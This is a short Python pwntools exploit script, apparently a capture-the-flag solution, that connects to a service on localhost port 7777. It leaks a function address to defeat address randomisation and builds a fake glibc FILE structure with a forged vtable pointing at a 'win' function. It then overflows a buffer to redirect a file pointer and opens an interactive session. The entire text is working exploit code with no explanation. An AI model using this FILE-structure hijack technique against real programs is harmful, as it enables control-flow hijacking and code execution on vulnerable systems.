from pwn import *

p = remote('localhost', 7777)

win = 0xa5a
buf = 0x202060

p.recvuntil('<win> = ')
x = int(p.recvline()[:-1], 16)
print(hex(x))

base = x - win
win = x 
buf += base 
vtable = buf + 0xe0

# fake fp
payload = p64(0xfbad1800)
payload += p64(0) * 16
payload += p64(buf + 0x8)   # _lock (NULL address)
payload += p64(0) * 9
payload += p64(vtable)  # *vtable

# fake _IO_jump_t
payload += p64(win) * 22

payload += b'A' * (0x200 - len(payload))
payload += p64(buf)

p.sendline(payload)

p.interactive()
